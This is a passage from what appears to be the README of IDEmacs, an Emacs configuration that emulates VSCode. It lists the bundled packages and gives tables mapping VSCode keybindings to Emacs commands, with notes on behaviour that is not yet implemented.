      &lt;item&gt;All editing packages required for emulation, including &lt;code&gt;whole-line-or-region&lt;/code&gt;,&lt;code&gt;expand-region&lt;/code&gt;,&lt;code&gt;multiple-cursors&lt;/code&gt;, and&lt;code&gt;smartparens&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;vc&lt;/code&gt;and&lt;code&gt;magit&lt;/code&gt;for version control&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;diff-hl&lt;/code&gt;and&lt;code&gt;blamer&lt;/code&gt;to show in-buffer version control information&lt;/item&gt;
      &lt;item&gt;A comprehensive collection of completion packages - Vertico, &lt;code&gt;orderless&lt;/code&gt;, Consult,&lt;code&gt;marginalia&lt;/code&gt;, and&lt;code&gt;company&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Lisp editing packages - &lt;code&gt;sly&lt;/code&gt;,&lt;code&gt;geiser&lt;/code&gt;, and&lt;code&gt;adjust-parens&lt;/code&gt;(similar to Parinfer)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;eat&lt;/code&gt;for terminals&lt;/item&gt;
      &lt;item&gt;Sensible Emacs defaults, and other goodies - &lt;code&gt;org-superstar&lt;/code&gt;,&lt;code&gt;pdf-tools&lt;/code&gt;,&lt;code&gt;undo-tree&lt;/code&gt;,&lt;code&gt;helpful&lt;/code&gt;,&lt;code&gt;rainbow-mode&lt;/code&gt;, …&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;&lt;code&gt;use-package&lt;/code&gt; is used to keep the code organized.&lt;/p&gt;
    &lt;head rend="h4"&gt;Keybinding coverage&lt;/head&gt;
    &lt;p&gt;An empty command cell means we haven't bound anything to these keys yet.&lt;/p&gt;
    &lt;head rend="h5"&gt;General&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Keybinding&lt;/cell&gt;
        &lt;cell role="head"&gt;VSCode description&lt;/cell&gt;
        &lt;cell role="head"&gt;IDEmacs-VSCode command&lt;/cell&gt;
        &lt;cell role="head"&gt;Notes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-p&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show Command Palette&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;execute-extended-command&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;VSCode also binds F1 to this, but we currently leave that to the Emacs help prefixes.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-p&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Quick Open, Go to File&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;consult-locate&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;FIXME - behaviour differs from VSCode. Without a search term, VSCode suggests currently- and recently-opened files. Once a search term is entered, it searches for currently- and recently-opened files and the files in the currently opened project.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-n&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;New window/instance&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;make-frame&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-w&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Close window/instance&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;idemacs-kill-buffer-noprompt&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-,&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;User Settings&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;customize&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k C-s&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Keyboard Shortcuts&lt;/cell&gt;
        &lt;cell&gt;We need to make an interface for this.&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h5"&gt;Keys not mentioned in the VSCode keyboard shortcuts PDF&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Keybinding&lt;/cell&gt;
        &lt;cell role="head"&gt;IDEmacs-VSCode command&lt;/cell&gt;
        &lt;cell role="head"&gt;Notes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;code&gt;&amp;lt;escape&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;idemacs-escape&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Tries to provide VSCode behaviour while also acting as &lt;code&gt;C-g&lt;/code&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-a&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;idemacs-select-all&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k C-o&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;treemacs-select-directory&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;FIXME - behaviour differs from VSCode. This should not just open a directory in Treemacs but also load the corresponding &lt;code&gt;desktop&lt;/code&gt; file for it.&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h5"&gt;Basic editing&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Keybinding&lt;/cell&gt;
        &lt;cell role="head"&gt;VSCode description&lt;/cell&gt;
        &lt;cell role="head"&gt;IDEmacs-VSCode command&lt;/cell&gt;
        &lt;cell role="head"&gt;Notes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-x&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Cut line (empty selection)&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;cua-cut-handler&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;empty selection behaviour is TODO&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-c&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Copy line (empty selection)&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;cua-copy-handler&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;empty selection behaviour is TODO&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;&lt;code&gt;M-&amp;lt;up&amp;gt;&lt;/code&gt; / &lt;code&gt;M-&amp;lt;down&amp;gt;&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Move line up/down&lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;drag-stuff-up&lt;/code&gt; / &lt;code&gt;drag-stuff-down&lt;/code&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-k&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Delete line&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;whole-line-or-region-kill-region&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;&lt;code&gt;C-RET&lt;/code&gt; / &lt;code&gt;C-S-RET&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Insert line below/above&lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;idemacs-open-line&lt;/code&gt; / &lt;code&gt;idemacs-open-line-above&lt;/code&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-\&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Jump to matching bracket&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;&lt;code&gt;C-]&lt;/code&gt; / &lt;code&gt;C-[&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Indent/Outdent line&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;&lt;code&gt;&amp;lt;home&amp;gt;&lt;/code&gt; / &lt;code&gt;&amp;lt;end&amp;gt;&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Go to beginning/end of line&lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;move-beginning-of-line&lt;/code&gt; / &lt;code&gt;move-end-of-line&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;vanilla Emacs defaults&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;&lt;code&gt;C-&amp;lt;home&amp;gt;&lt;/code&gt; / &lt;code&gt;C-&amp;lt;end&amp;gt;&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Go te beginning/end of file&lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;beginning-of-buffer&lt;/code&gt; / &lt;code&gt;end-of-buffer&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;vanilla Emacs defaults&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;&lt;code&gt;C-&amp;lt;up&amp;gt;&lt;/code&gt; / &lt;code&gt;C-&amp;lt;down&amp;gt;&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Scroll line up/down&lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;scroll-down-line&lt;/code&gt; / &lt;code&gt;scroll-up-line&lt;/code&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;&lt;code&gt;M-&amp;lt;prior&amp;gt;&lt;/code&gt; (Page Up) / &lt;code&gt;M-&amp;lt;next&amp;gt;&lt;/code&gt; (Page Down)&lt;/cell&gt;
        &lt;cell&gt;Scroll page up/down&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;&lt;code&gt;C-S-[&lt;/code&gt; / &lt;code&gt;C-S-]&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Fold/unfold region&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;&lt;code&gt;C-k C-[&lt;/code&gt; / &lt;code&gt;C-k C-]&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Fold/unfold all subregions&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;&lt;code&gt;C-k C-0&lt;/code&gt; / &lt;code&gt;C-k C-j&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Fold/unfold all regions&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k C-c&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Add line comment&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;idemacs-comment-line&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;In VSCode, subsequent presses add additional comment characters to the start of the line, whereas IDEmacs-VSCode just toggles the comment.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k C-u&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Remove line comment&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;idemacs-comment-line&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;In VSCode, subsequent presses remove additional comment characters from the start of the line, whereas IDEmacs-VSCode just toggles the comment.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-/&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Toggle line comment&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-a&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Toggle block comment&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;M-z&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Toggle word wrap&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;toggle-truncate-lines&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h5"&gt;Rich languages editing&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Keybinding&lt;/cell&gt;
        &lt;cell role="head"&gt;VSCode description&lt;/cell&gt;
        &lt;cell role="head"&gt;IDEmacs-VSCode command&lt;/cell&gt;
        &lt;cell role="head"&gt;Notes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;&lt;code&gt;C-SPC&lt;/code&gt;, &lt;code&gt;C-i&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Trigger suggestion&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-SPC&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Trigger parameter hints&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-i&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Format document&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k C-f&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Format selection&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;&amp;lt;f12&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Go to definition&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;xref-find-definitions&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-&amp;lt;f10&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Peek definition&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k &amp;lt;f12&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Open definition to the side&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-.&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Quick fix&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;S-&amp;lt;f12&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show references&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;xref-find-references&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;&amp;lt;f2&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Rename symbol&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k C-x&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Trim trailing whitespace&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;delete-trailing-whitespace&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k m&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Change file language&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h5"&gt;Multi-cursor and selection&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Keybinding&lt;/cell&gt;
        &lt;cell role="head"&gt;VSCode description&lt;/cell&gt;
        &lt;cell role="head"&gt;IDEmacs-VSCode command&lt;/cell&gt;
        &lt;cell role="head"&gt;Notes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;M-&amp;lt;down-mouse-1&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Insert cursor&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;mc/toggle-cursor-on-click&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;&lt;code&gt;M-S-&amp;lt;up&amp;gt;&lt;/code&gt; / &lt;code&gt;M-S-&amp;lt;down&amp;gt;&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Insert cursor above/below&lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;mc/mark-previous-lines&lt;/code&gt; / &lt;code&gt;mc/mark-next-lines&lt;/code&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-u&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Undo last cursor operation&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;M-S-i&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Insert cursor at end of each line selected&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;mc/edit-ends-of-lines&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-l&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Select current line&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-l&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Select all occurrences of current selection&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;mc/mark-all-like-this&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-&amp;lt;f2&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Select all occurrences of current word&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;mc/mark-all-words-like-this&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;M-S-&amp;lt;right&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Expand selection&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;er/expand-region&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;M-S-&amp;lt;left&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Shrink selection&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;er/contract-region&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;M-S-&amp;lt;down-mouse-1&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Column (box) selection&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;idemacs-mouse-drag-rectangle&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h5"&gt;Display&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Keybinding&lt;/cell&gt;
        &lt;cell role="head"&gt;VSCode description&lt;/cell&gt;
        &lt;cell role="head"&gt;IDEmacs-VSCode command&lt;/cell&gt;
        &lt;cell role="head"&gt;Notes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;&amp;lt;f11&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Toggle full screen&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;toggle-frame-fullscreen&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;vanilla Emacs defaults&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;M-S-0&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Toggle editor layout (horizontal/vertical)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;&lt;code&gt;C-\=&lt;/code&gt; / &lt;code&gt;C--&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Zoom in/out&lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;text-scale-increase&lt;/code&gt; / &lt;code&gt;text-scale-decrease&lt;/code&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-b&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Toggle sidebar visibility&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-e&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show Explorer/ Toggle focus&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;idemacs-treemacs&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-f&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show Search&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-g&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show Source Control&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;magit-status&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-d&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show Debug&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-x&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show Extensions&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;list-packages&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;We need to write a better interface. Elpaca may be an option.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-h&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Replace in files&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;isearch-query-replace&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;We need an incremental, multi-file replacement UI.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-j&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Toggle Search details&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-c&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Open new command prompt/terminal&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k C-h&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show output panel&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-v&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Open Markdown preview&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k v&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Open Markdown preview to the side&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k z&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Zen Mode (Esc Esc to exit)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h5"&gt;Search and replace&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Keybinding&lt;/cell&gt;
        &lt;cell role="head"&gt;VSCode description&lt;/cell&gt;
        &lt;cell role="head"&gt;IDEmacs-VSCode command&lt;/cell&gt;
        &lt;cell role="head"&gt;Notes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-t&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show all symbols&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-g&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Go to line&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;consult-line&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-p&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Go to file&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;consult-locate&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;FIXME - behaviour differs from VSCode&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-o&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Go to symbol&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;consult-imenu-multi&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;FIXME - behaviour differs from VSCode&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-m&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show problems panel&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;&amp;lt;f8&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Go to next error or warning&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;S-&amp;lt;f8&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Go to previous error or warning&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S-&amp;lt;tab&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Navigate editor group history&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-M--&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Go back&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-S--&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Go forward&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;C-m&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Toggle Tab moves focus&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h5"&gt;Editor management&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Keybinding&lt;/cell&gt;
        &lt;cell role="head"&gt;VSCode description&lt;/cell&gt;
        &lt;cell role="head"&gt;IDEmacs-VSCode command&lt;/cell&gt;
        &lt;cell role="head"&gt;Notes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-w&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Close editor&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;idemacs-kill-buffer-noprompt&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;FIXME - behaviour differs from VSCode&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-k f&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Close folder&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;C-\&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Split editor&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;split-window-right&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
